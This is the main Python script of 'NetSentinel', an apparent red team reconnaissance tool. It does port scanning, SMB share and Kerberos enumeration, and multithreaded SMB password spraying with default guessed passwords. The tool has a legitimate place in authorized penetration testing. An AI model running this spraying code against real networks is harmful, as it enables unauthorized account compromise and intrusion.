# main.py

import ipaddress
import argparse
import json
from datetime import datetime
from utils import Logger, Config, COMMON_TCP_PORTS, parse_ports, generate_html_report
from core import NetworkScanner, SMBEnumerator, KerberosScanner
import time
import pyfiglet


def load_user_list(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def load_password_list(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def smb_password_spray(target_ip, domain, user_list, password_list, logger, delay=0, max_threads=20):
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import threading

    successes = []
    failures = []
    lock = threading.Lock()

    smb_enum = SMBEnumerator(target_ip, domain, logger)

    if smb_enum.connection is None:
        logger.error("No SMB connection available. Aborting spray.")
        return successes, failures

    def try_credential(username, password):
        nonlocal smb_enum
        try:
            logger.info(f"[SPRAY] Trying {username}@{domain}:{password}")
            success = smb_enum.try_login(username, password)
            with lock:
                if success:
                    logger.info(f"SUCCESS: {username}:{password}")
                    successes.append((username, password))
                else:
                    failures.append((username, password))
        except Exception as e:
            with lock:
                logger.warning(f"Error during login attempt for {username}:{password} - {e}")
                failures.append((username, password))

        if delay:
            time.sleep(delay)

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for username in user_list:
            for password in password_list:
                futures.append(executor.submit(try_credential, username, password))

        for future in as_completed(futures):
            _ = future.result()

    return successes, failures


def main():
    ascii_title = pyfiglet.figlet_format("NetSentinel")

    parser = argparse.ArgumentParser(
        description=ascii_title + "\nNetwork Recon Tool by Kaotick Jay.\n\nNetSentinel is a Python-based red team reconnaissance framework designed for stealthy internal enumeration, service discovery, and lateral movement preparation. ",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--target", required=True, help="Target IP or CIDR (e.g., 192.168.1.0/24 or 10.0.0.1)")
    parser.add_argument("--scan-type", choices=["full", "quick"], default="quick", help="Type of scan to perform")
    parser.add_argument("--resolve-hostnames", action="store_true", help="Resolve hostnames via reverse DNS")
    parser.add_argument("--smb-enum", action="store_true", help="Perform SMB share enumeration")
    parser.add_argument("--kerberos-scan", action="store_true", help="Perform Kerberos enumeration")
    parser.add_argument("--user-list", type=str, help="File with list of usernames for password spraying")
    parser.add_argument("--password-list", type=str, help="File with list of passwords for password spraying")
    parser.add_argument("--password-spray", action="store_true", help="Enable SMB password spraying")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--html-report", type=str, help="Output path for HTML report")
    args = parser.parse_args()

    logger = Logger(debug=args.debug)
    logger.banner("NetSentinel Network Recon Tool")

    cfg = Config()
    if not cfg.validate():
        logger.error("Failed to load configuration. Exiting.")
        return
    cfg.dump()

    try:
        network = ipaddress.ip_network(args.target, strict=False)
        targets = [str(ip) for ip in network.hosts()]
        network_range = str(network)
        host_count = len(targets)
    except ValueError:
        targets = [args.target]
        network_range = args.target
        host_count = 1

    scan_type = args.scan_type

    user_list = []
    if args.user_list:
        try:
            user_list = load_user_list(args.user_list)
            logger.info(f"Loaded {len(user_list)} users from {args.user_list}")
        except Exception as e:
            logger.error(f"Failed to load user list: {e}")
            return

    password_list = []
    if args.password_list:
        try:
            password_list = load_password_list(args.password_list)
            logger.info(f"Loaded {len(password_list)} passwords from {args.password_list}")
        except Exception as e:
            logger.error(f"Failed to load password list: {e}")
            return
    else:
        password_list = ["Passw0rd!", "Password123", "Spring2025!"]

    results_all = {}
    empty_hosts = []

    scan_start_ts = datetime.now()
    scan_start_time = time.time()

    for target_ip in targets:
        host_scan_start = time.time()
        logger.info(f"Starting network scan on {target_ip}. Scan type: {scan_type}")
        scanner = NetworkScanner(target_ip, logger)
        results = scanner.run()

        hostname = ""
        if args.resolve_hostnames:
            import socket
            try:
                hostname = socket.gethostbyaddr(target_ip)[0]
                logger.debug(f"Resolved {target_ip} → {hostname}")
                logger.info(f"Resolved hostname: {hostname}")
            except Exception as e:
                logger.warning(f"Reverse DNS resolution failed for {target_ip}: {e}")

        open_ports = results.get(target_ip, {}).get("open_ports", {})
        open_ports_list = list(open_ports.keys()) if isinstance(open_ports, dict) else []

        if open_ports_list:
            logger.info(f"Open ports on {target_ip}: {open_ports_list}")
        else:
            logger.warning(f"No open ports detected on {target_ip}.")
            empty_hosts.append(target_ip)
            continue  # Skip rest of logic for hosts with no open ports

        smb_shares = []
        if args.smb_enum:
            smb_enum = SMBEnumerator(target_ip, cfg.domain, logger)
            try:
                smb_shares = smb_enum.enumerate_shares()
                logger.info(f"Found {len(smb_shares)} SMB shares.")
            except Exception as e:
                logger.error(f"SMB enumeration failed: {e}")

        kerberos_info = {}
        if args.kerberos_scan:
            try:
                kerberos_scanner = KerberosScanner(
                    logger=logger,
                    domain=cfg.domain,
                    username=cfg.username,
                    password=cfg.password,
                    dc_ip=cfg.dc_ip,
                    ldap_username=cfg.ldap_username,
                    ldap_password=cfg.ldap_password
                )
                kerberos_info = kerberos_scanner.enumerate(targets=[target_ip], user_list=user_list)
                logger.info("Kerberos enumeration complete.")
            except Exception as e:
                logger.error(f"Kerberos enumeration failed: {e}")

        password_spray_successes = []
        password_spray_failures = []
        if args.password_spray:
            if not user_list:
                logger.error("Password spraying requested but no user list loaded.")
            else:
                logger.info(f"Starting SMB password spraying on {target_ip} with {len(user_list)} users and {len(password_list)} passwords.")
                password_spray_successes, password_spray_failures = smb_password_spray(
                    target_ip=target_ip,
                    domain=cfg.domain,
                    user_list=user_list,
                    password_list=password_list,
                    logger=logger,
                    delay=1
                )
                logger.info(f"Password spraying complete: {len(password_spray_successes)} successes, {len(password_spray_failures)} failures")

        host_scan_end = time.time()
        host_scan_duration = host_scan_end - host_scan_start
        h_m, s = divmod(int(host_scan_duration), 60)
        duration_str = f"{h_m}m {s}s"

        results_all[target_ip] = {
            "target": target_ip,
            "hostname": hostname,
            "ports": [
                {"port": p, "status": "Open", "banner": scanner.get_banner(target_ip, p)}
                for p in open_ports_list
            ],
            "smb_shares": smb_shares,
            "kerberos_info": kerberos_info,
            "password_spray_successes": password_spray_successes,
            "password_spray_failures": password_spray_failures,
            "scan_time": datetime.now().isoformat(),
            "host_scan_start": datetime.fromtimestamp(host_scan_start).isoformat(),
            "host_scan_end": datetime.fromtimestamp(host_scan_end).isoformat(),
            "host_scan_duration": duration_str,
            "network_range": network_range,
            "host_count": host_count,
        }

    scan_end_ts = datetime.now()
    scan_end_time = time.time()
    total_duration_seconds = scan_end_time - scan_start_time
    hours, remainder = divmod(int(total_duration_seconds), 3600)
    minutes, seconds = divmod(remainder, 60)
    scan_duration_str = f"{hours}h {minutes}m {seconds}s" if hours > 0 else f"{minutes}m {seconds}s"

    summary_report = {
        "target": network_range,
        "hostname": "Multiple hosts" if host_count > 1 else results_all[targets[0]]["hostname"] if results_all else "N/A",
        "ports": [],
        "smb_shares": [],
        "kerberos_info": {},
        "password_spray_successes": [],
        "password_spray_failures": [],
        "scan_time": scan_start_ts.isoformat(),
        "scan_end_time": scan_end_ts.isoformat(),
        "scan_duration": scan_duration_str,
        "network_range": network_range,
        "host_count": host_count,
        "empty_hosts": empty_hosts,
        "full_results": results_all,
    }

    if args.html_report:
        try:
            generate_html_report(summary_report, args.html_report)
            logger.info(f"HTML report generated at {args.html_report}")
        except Exception as e:
            logger.error(f"Failed to generate HTML report: {e}")

    logger.success("NetSentinel recon complete.")


if __name__ == "__main__":
    main()

